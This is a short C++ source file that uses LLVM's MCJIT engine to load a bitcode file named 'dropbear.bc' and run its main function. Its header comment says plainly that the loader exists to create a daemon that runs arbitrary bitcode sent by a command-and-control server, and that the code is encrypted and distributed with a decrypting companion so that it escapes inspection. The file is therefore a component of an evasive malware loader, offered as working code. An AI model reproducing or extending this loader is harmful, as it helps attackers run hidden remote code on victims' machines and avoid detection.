#include <iostream>

#include <llvm/ExecutionEngine/ExecutionEngine.h>
#include <llvm/ExecutionEngine/MCJIT.h>
#include <llvm/IR/Module.h>
#include <llvm/IRReader/IRReader.h>
#include <llvm/IR/LLVMContext.h>
#include <llvm/Support/SourceMgr.h>

using namespace llvm;
using namespace std;

/**
   This is mainly a copy of vm.cpp, so why do we want to
   run the JIT within itself so to speak? The reason is because
   we want this module to serve as machinery that creates
   a daemon and facilitates the arbitrary execution of bitcode
   distributed by a C&C.

   We would like this code to remain free from inspection, so since
   we compile it to bitcode, we can encrypt it and distribute it
   with vm.cpp, which will simply decrypt it and pass it to the
   JIT.
*/
int main (int argc, const char *argv[]) {
  LLVMContext context;
  
  SMDiagnostic error;
  Module *m = ParseIRFile("dropbear.bc", error, context);

  ExecutionEngine *TheExecutionEngine;
  
  // Create the JIT.  This takes ownership of the module.
  TheExecutionEngine = EngineBuilder(m).setUseMCJIT(true).create();
  
  Function *f = m->getFunction("main");
  
  if(!f) {
    cerr << "Function payload not defined!" << endl;
    exit(1);
  }
  
  TheExecutionEngine->finalizeObject();
  
  // JIT the function, returning a function pointer.
  void *FPtr = TheExecutionEngine->getPointerToFunction(f);

  int (*FP)(int argc, const char*[]) = (int (*)(int argc, const char*[]))FPtr;
  
  FP(argc, argv);
  
  return 0;
}
